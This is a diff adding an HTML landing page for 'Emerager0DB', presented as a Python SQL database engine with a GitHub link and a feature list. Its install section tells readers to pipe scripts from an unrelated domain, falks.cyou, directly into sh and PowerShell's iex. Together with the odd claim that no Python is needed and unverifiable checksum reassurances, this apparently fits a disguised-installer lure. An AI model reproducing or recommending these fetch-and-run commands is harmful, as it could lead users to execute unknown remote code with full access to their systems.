@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Emerager0DB</title>
+  <meta name="description" content="Emerager0DB is a lightweight SQL database engine written in Python.">
+  <link rel="stylesheet" href="/style.css">
+  <script src="/app.js" defer></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap bar">
+      <a class="brand" href="/">Emerager0DB</a>
+      <nav aria-label="Main">
+        <a href="/">Home</a>
+        <a href="#download">Download</a>
+        <a href="/docs">Documentation</a>
+        <a href="https://github.com/rrs803465-ai/EMERAGER0DB-BYEMERAGER0" rel="noopener">GitHub</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <section class="hero">
+      <h1>Emerager0DB</h1>
+      <p class="lede">A lightweight SQL database engine written in Python.</p>
+      <div class="actions">
+        <a class="button primary" href="#download">Download</a>
+        <a class="button" href="https://github.com/rrs803465-ai/EMERAGER0DB-BYEMERAGER0" rel="noopener">GitHub</a>
+        <a class="button" href="/docs">Documentation</a>
+      </div>
+      <p class="meta">Latest version: <span id="latest-version">loading</span></p>
+    </section>
+
+    <section id="download" class="block">
+      <h2>Install</h2>
+      <p>Installers verify the release checksum before anything is installed. No Python is required.</p>
+
+      <h3>Linux and macOS</h3>
+      <pre><code>curl -fsSL https://falks.cyou/get | sh</code></pre>
+
+      <h3>Windows (PowerShell)</h3>
+      <pre><code>irm https://falks.cyou/get.ps1 | iex</code></pre>
+
+      <p>After installing, restart your shell and run <code>Emerager0DB</code>.</p>
+    </section>
+
+    <section class="block">
+      <h2>Features</h2>
+      <ul class="features">
+        <li>SQL parser and executor built in-house, not a wrapper around another database</li>
+        <li>Persistent <code>.edb</code> files with checksums and atomic writes</li>
+        <li>NULL as a first-class value, WHERE, ORDER BY, LIMIT, DISTINCT, GROUP BY and aggregates</li>
+        <li>Indexes, transactions, backups and SQL import and export</li>
+        <li>Accounts with salted PBKDF2 password hashing and per-database permissions</li>
+        <li>Python API with parameterized queries</li>
+      </ul>
+    </section>
+
+    <section class="block">
+      <h2>Architecture</h2>
+      <p>The CLI sits on a session layer, which enforces authentication and permissions. Statements go through a lexer and parser into an AST, then an executor. The executor works on tables and indexes, which the storage layer persists as checksummed files. This Railway service only publishes release metadata and installers. Your databases stay on your machine.</p>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap">
+      <span>Open-source project made by Emerager0</span>
+      <a href="https://github.com/rrs803465-ai/EMERAGER0DB-BYEMERAGER0" rel="noopener">Star the repo on GitHub</a>
+    </div>
+  </footer>
+</body>
+</html>
